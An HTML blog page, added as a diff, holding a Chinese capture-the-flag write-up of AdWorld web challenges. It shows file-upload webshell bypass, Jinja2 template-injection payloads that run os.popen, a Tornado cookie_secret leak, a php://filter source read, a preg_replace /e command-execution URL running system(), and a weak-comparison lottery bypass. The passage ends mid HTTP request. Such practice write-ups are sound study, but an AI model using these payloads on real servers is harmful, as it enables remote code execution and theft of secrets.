@@ -1,0 +1,863 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/moon.png">
+  <link rel="icon" href="/img/moon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="冰蓝弧影">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="upload1 文件上传题，先上传一个图片试试看，文件名可以回显，利用时间戳进行随机命名  接下来就是上马了，试试php一句话木马，有前端的限制  改个后缀继续上传，被waf检测到了  文件名再改回来，看看是不是waf对body进行过滤，看来是后缀php被过滤掉了，不对body进行检查  不知道怎么回事，突然又上传成功了，莫名其妙，难道换个网络能禁掉waf？后来看别人的wp，居然没有遇到waf！">
+<meta property="og:type" content="article">
+<meta property="og:title" content="攻防世界Web高手进阶区(二)">
+<meta property="og:url" content="https://blue-arc.github.io/2022/06/15/AdWorld-2/index.html">
+<meta property="og:site_name" content="冰蓝弧影">
+<meta property="og:description" content="upload1 文件上传题，先上传一个图片试试看，文件名可以回显，利用时间戳进行随机命名  接下来就是上马了，试试php一句话木马，有前端的限制  改个后缀继续上传，被waf检测到了  文件名再改回来，看看是不是waf对body进行过滤，看来是后缀php被过滤掉了，不对body进行检查  不知道怎么回事，突然又上传成功了，莫名其妙，难道换个网络能禁掉waf？后来看别人的wp，居然没有遇到waf！">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611085014026.png">
+<meta property="og:image" content="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611085136843.png">
+<meta property="og:image" content="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611085422720.png">
+<meta property="og:image" content="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611085840865.png">
+<meta property="og:image" content="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611091338595.png">
+<meta property="og:image" content="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611091944894.png">
+<meta property="og:image" content="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611093627244.png">
+<meta property="og:image" content="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611094503799.png">
+<meta property="og:image" content="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611101509107.png">
+<meta property="og:image" content="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611102046955.png">
+<meta property="og:image" content="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611105234034.png">
+<meta property="og:image" content="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611111821319.png">
+<meta property="og:image" content="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611112400102.png">
+<meta property="og:image" content="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220613202134087.png">
+<meta property="og:image" content="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220614211204850.png">
+<meta property="og:image" content="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220615093333178.png">
+<meta property="og:image" content="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220615093806567.png">
+<meta property="og:image" content="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220615100711367.png">
+<meta property="og:image" content="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220615112602398.png">
+<meta property="og:image" content="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220615144306598.png">
+<meta property="og:image" content="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220615145548623.png">
+<meta property="og:image" content="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220615151152237.png">
+<meta property="article:published_time" content="2022-06-15T07:13:00.000Z">
+<meta property="article:modified_time" content="2022-06-15T07:20:17.591Z">
+<meta property="article:author" content="冰蓝弧影">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611085014026.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>攻防世界Web高手进阶区(二) - 冰蓝弧影</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/fluid-extension.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"blue-arc.github.io","root":"/","version":"1.9.0","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>BlueArc</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="攻防世界Web高手进阶区(二)"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-06-15 15:13" pubdate>
+          2022年6月15日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          46 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">攻防世界Web高手进阶区(二)</h1>
+            
+            <div class="markdown-body">
+              
+              <h1 id="upload1"><a class="markdownIt-Anchor" href="#upload1"></a> upload1</h1>
+<p>文件上传题，先上传一个图片试试看，文件名可以回显，利用时间戳进行随机命名</p>
+<p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611085014026.png" srcset="/img/loading.gif" lazyload alt="" /></p>
+<p>接下来就是上马了，试试php一句话木马，有前端的限制</p>
+<p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611085136843.png" srcset="/img/loading.gif" lazyload alt="" /></p>
+<p>改个后缀继续上传，被waf检测到了</p>
+<p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611085422720.png" srcset="/img/loading.gif" lazyload alt="" /></p>
+<p>文件名再改回来，看看是不是waf对body进行过滤，看来是后缀php被过滤掉了，不对body进行检查</p>
+<p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611085840865.png" srcset="/img/loading.gif" lazyload alt="" /></p>
+<p>不知道怎么回事，突然又上传成功了，莫名其妙，难道换个网络能禁掉waf？后来看别人的wp，居然没有遇到waf！<strong>看来这个病毒检测是我自己浏览器执行的，太tm坑了</strong>，我还在找各种后端绕过姿势😅</p>
+<p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611091338595.png" srcset="/img/loading.gif" lazyload alt="" /></p>
+<p>总结来讲就是前端白名单过滤而已，没有后端限制，那不随便绕过</p>
+<hr />
+<h1 id="web_python_template_injection"><a class="markdownIt-Anchor" href="#web_python_template_injection"></a> Web_python_template_injection</h1>
+<p>看题目是python的模板注入，用wappalyzer分析一下，python2.7 + flask 0.15</p>
+<p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611091944894.png" srcset="/img/loading.gif" lazyload alt="" /></p>
+<p>了解了解模板注入相关知识，hackbar自带各个服务器版本的模板注入, payload为</p>
+<p><code>http://111.200.241.244:59314/&#123;&#123;g.pop.__globals__.__builtins__['__import__']('os').popen('ls').read()&#125;&#125;</code></p>
+<p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611093627244.png" srcset="/img/loading.gif" lazyload alt="" /></p>
+<p>看到fl4g，cat得flag <code>ctf&#123;f22b6844-5169-4054-b2a0-d95b9361cb57&#125;</code></p>
+<hr />
+<h1 id="easytornado"><a class="markdownIt-Anchor" href="#easytornado"></a> easytornado</h1>
+<p>Tornado 框架，看看flag.txt里面有啥，它说在/fllllllllllllag里面</p>
+<p>根据url是通过file页面传递filename变量进行文件查看，后面还跟一个hash值</p>
+<p><code>111.200.241.244:58328/file?filename=/flag.txt&amp;filehash=fe0c9ba81112b2249b3f3b448b3b19e6</code></p>
+<p>hash值的计算方法在hints.php里面</p>
+<p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611094503799.png" srcset="/img/loading.gif" lazyload alt="" /></p>
+<p>由于md5不可逆，关键是找到cookie_secret，网上找找tornado框架的cookie_secret相关知识</p>
+<blockquote>
+<p>官方文档关于安全cookie介绍 <a target="_blank" rel="noopener" href="https://tornado-zh.readthedocs.io/zh/latest/guide/security.html#cookies-secure-cookies">认证和安全 — Tornado 4.3 文档 (tornado-zh.readthedocs.io)</a></p>
+</blockquote>
+<p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611101509107.png" srcset="/img/loading.gif" lazyload alt="" /></p>
+<p>简而言之，<code>cookie_secret</code>保证完整性但不保证机密性，看看能不能用其他方式泄露<code>cookie_secret</code></p>
+<p>看看第二个页面render函数有什么作用，render意为渲染；<code>self.render(&quot;entry.html&quot;, entry=entry)</code> 表示用entry.html这个模板，用右边entry来实例化该模板中的entry参数，从而显示在页面上。</p>
+<p>在进行测试的时候出现以下页面，出错页面，通过msg变量进行渲染，看看能不能利用</p>
+<p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611102046955.png" srcset="/img/loading.gif" lazyload alt="" /></p>
+<p>尝试了一下服务器直接给我跪了，<s>调皮</s></p>
+<p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611105234034.png" srcset="/img/loading.gif" lazyload alt="" /></p>
+<p>查阅官方文档，<code>cookie_secret</code> 在Application对象settings的属性中 ，赋值handler.settings</p>
+<p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611111821319.png" srcset="/img/loading.gif" lazyload alt="" /></p>
+<p><code>cookie_secret</code>值为<code>93ee0919-c1d4-4e69-8f85-f23a4cc728c8</code>剩下的就是计算/fllllllllllllag的hash进行拼接</p>
+<p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611112400102.png" srcset="/img/loading.gif" lazyload alt="" /></p>
+<p>本题就是了解tornado框架的cookie_secret 和template render的利用</p>
+<hr />
+<h1 id="shrine"><a class="markdownIt-Anchor" href="#shrine"></a> shrine</h1>
+<p>源码审计</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> flask <br><span class="hljs-keyword">import</span> os <br>app = flask.Flask(__name__) <br>app.config[<span class="hljs-string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="hljs-string">&#x27;FLAG&#x27;</span>) <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>) </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>(): <br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(__file__).read() <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/shrine/&#x27;</span></span>) </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">shrine</span>(<span class="hljs-params">shrine</span>): <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_jinja</span>(<span class="hljs-params">s</span>): <br>        s = s.replace(<span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>) <br>        blacklist = [<span class="hljs-string">&#x27;config&#x27;</span>, <span class="hljs-string">&#x27;self&#x27;</span>] <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> blacklist]) + s <br>    <span class="hljs-keyword">return</span> flask.render_template_string(safe_jinja(shrine))<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>: <br>    app.run(debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure>
+<p>这题看了半天，有几个比较疑惑的点</p>
+<p>通过获取FLAG环境变量存放再app.config.里</p>
+<p>但第二个路由我看不懂shrine的参数怎么给的，没有网络请求获取，也没有从路由里面获取，我在本地环境测试了下会报错</p>
+<p>从路由获取的话是下面这个格式<code>@app.route('/shrine/&lt;shrine&gt;')</code></p>
+<blockquote>
+<p>通过把 URL 的一部分标记为 <code>&lt;variable_name&gt;</code> 就可以在 URL 中添加变量。标记的 部分会作为关键字参数传递给函数。通过使用 <code>&lt;converter:variable_name&gt;</code> ，可以 选择性的加上一个转换器，为变量指定规则。</p>
+</blockquote>
+<p>没办法咯，只能看wp😭，说是模板注入(<s>怎么个模板注入法，自己的环境复现不了</s>)，在靶机上试下</p>
+<p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220613202134087.png" srcset="/img/loading.gif" lazyload alt="" /></p>
+<p>黑名单会把config和self设为None，而我们正要获取app.config</p>
+<p>获取flask的全局配置途径我也不太懂，直接粘贴下来，收集下来方便以后使用</p>
+<p><code>current_app</code>为全局代理变量</p>
+<p>payload为<code>&#123;&#123;url_for.__globals__['current_app'].config&#125;&#125;</code></p>
+<hr />
+<h1 id="ics-05"><a class="markdownIt-Anchor" href="#ics-05"></a> ics-05</h1>
+<blockquote>
+<p>tips: 其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统</p>
+</blockquote>
+<p>访问设备维护中心啥也没有，看看网络请求发现奇怪的东西<code>http://111.200.241.244:52497/somrthing.json?page=1&amp;limit=10</code></p>
+<p>这个状态码为404，尝试对page的值进行爆破，但没什么卵用</p>
+<p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220614211204850.png" srcset="/img/loading.gif" lazyload alt="" /></p>
+<p>发现<code>http://111.200.241.244:51326/index.php?page=1</code> 有回显，试了试sqlmap，也没什么用</p>
+<p>看wp发现使用伪协议，但这个不是在文件包含里面用的吗？<s>怎么发现的</s> 看来还是对这种url形式不敏感，读取源码</p>
+<p><code>http://111.200.241.244:51326/index.php?page=php://filter/read=convert.base64-encode/resource=index.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$page</span>, <span class="hljs-string">&#x27;input&#x27;</span>) &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$page</span>, <span class="hljs-string">&#x27;ta:text&#x27;</span>) &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$page</span>, <span class="hljs-string">&#x27;text&#x27;</span>) &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$page</span> === <span class="hljs-string">&#x27;index.php&#x27;</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Ok&#x27;</span>);<br>    &#125;<br>	<span class="hljs-keyword">include</span>(<span class="hljs-variable">$page</span>);<br>	<span class="hljs-keyword">die</span>();<br><span class="hljs-meta">?&gt;</span><br>    <br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] === <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>) &#123;<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;</span>;<br><br>    <span class="hljs-variable">$pattern</span> = <span class="hljs-variable">$_GET</span>[pat];<br>    <span class="hljs-variable">$replacement</span> = <span class="hljs-variable">$_GET</span>[rep];<br>    <span class="hljs-variable">$subject</span> = <span class="hljs-variable">$_GET</span>[sub];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$pattern</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$replacement</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$subject</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$replacement</span>, <span class="hljs-variable">$subject</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+<p>看到确实是文件包含，不过将input，text等过滤掉了，防止我们直接RCE拿flag</p>
+<p><strong><code>pre_replace</code></strong> 函数执行一个正则表达式的搜索和替换。</p>
+<blockquote>
+<p>/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。</p>
+</blockquote>
+<p>方法明确了，构造xff，进入函数内部执行preg_replace实现RCE, payload如下</p>
+<p><code>http://111.200.241.244:51326/index.php?pat=/bluearc/e&amp;rep=system('find -name *flag*')&amp;sub=bluearc</code></p>
+<p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220615093333178.png" srcset="/img/loading.gif" lazyload alt="" /></p>
+<blockquote>
+<p>find  -name * <em>flag</em> * 该命令可以有效找到以当前目录环境下的所有flag</p>
+<p>也可以 fine / -name * <em>flag</em> *</p>
+</blockquote>
+<p><code>http://111.200.241.244:51326/index.php?pat=/bluearc/e&amp;rep=system('./s3chahahaDir/flag/flag.php')&amp;sub=bluearc</code></p>
+<p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220615093806567.png" srcset="/img/loading.gif" lazyload alt="" /></p>
+<p><em><strong>总结一下</strong></em></p>
+<ul>
+<li>
+<p>要对<code>?page=</code> 或者<code>?file=</code> 带回显的敏感一点，有可能是文件包含，然后通过伪协议获取源码</p>
+</li>
+<li>
+<p>**<code>pre_replace</code>**的/e漏洞，导致RCE</p>
+</li>
+</ul>
+<hr />
+<h1 id="lottery"><a class="markdownIt-Anchor" href="#lottery"></a> lottery</h1>
+<p>注册账号买彩票，初始$20，消耗$2买一张</p>
+<p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220615100711367.png" srcset="/img/loading.gif" lazyload alt="image-20220615100711367" /></p>
+<p>用burp抓包看了看，都是通过api.php的接口完成操作，没有可利用的点，给了一下提示，但抓包看没有折扣的地方</p>
+<blockquote>
+<p>Notice: You are offered a huge discount!</p>
+</blockquote>
+<p>必须得看源码，扫了下目录发现有git，解题点为<strong>git源码泄露</strong>，上git_extract脚本(后来发现题目给了源码)</p>
+<p>审计了一下源码，money的值保存在**<code>$_SESSION</code>**会话中，在注册的时候赋值为20</p>
+<p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220615112602398.png" srcset="/img/loading.gif" lazyload alt="" /></p>
+<p><strong><code>$_SESSION</code></strong> 对用户不可控，</p>
+<h3 id="session的工作原理"><a class="markdownIt-Anchor" href="#session的工作原理"></a> session的工作原理</h3>
+<blockquote>
+<p>PHP session 变量用于存储关于用户会话（session）的信息，或者更改用户会话（session）的设置。Session 变量存储单一用户的信息</p>
+</blockquote>
+<ul>
+<li>存储: 可通过phpinfo查看session.save_path的值，即存储位置。</li>
+</ul>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/php/</span>sess_PHPSESSID<br><span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/php/</span>sessions/sess_PHPSESSID<br><span class="hljs-regexp">/xxx/</span>tmp/sess_PHPSESSID<br><span class="hljs-regexp">/xxxx/</span>tmp<span class="hljs-regexp">/sessions/</span>sess_PHPSESSID<br></code></pre></td></tr></table></figure>
+<ul>
+<li>命名: session文件名格式为<code>sess_[phpsessid]</code>。而phpsessid来源于客户端存储的cookie字段。服务器会通过不同的session ID使用不同的文件</li>
+</ul>
+<p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220615144306598.png" srcset="/img/loading.gif" lazyload alt="" /></p>
+<p>即在session.save_path中该文件名为<code>sess_e59f658b4866e547c1118b4a3f48a3c1</code></p>
+<ul>
+<li>内容: 默认用session.serialize_handler的配置，对**<code>$_SESSION</code>**变量进行序列化后进行存储</li>
+</ul>
+<p>本题没有用到session的相关利用，一般是结合<strong>文件包含</strong></p>
+<p>再次进行源码审计，有以下思路</p>
+<ul>
+<li>修改自己的money</li>
+<li>降低flag的价格</li>
+<li>绕过中奖判断机制</li>
+</ul>
+<p>第三个具有可行性，比较数字的时候是用弱类型比较</p>
+<p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220615145548623.png" srcset="/img/loading.gif" lazyload alt="" /></p>
+<p><strong>数字比较可用true绕过</strong>，构造如下payload</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/api.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>111.200.241.244:65291<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>69<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.124 Safari/537.36 Edg/102.0.1245.41<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: 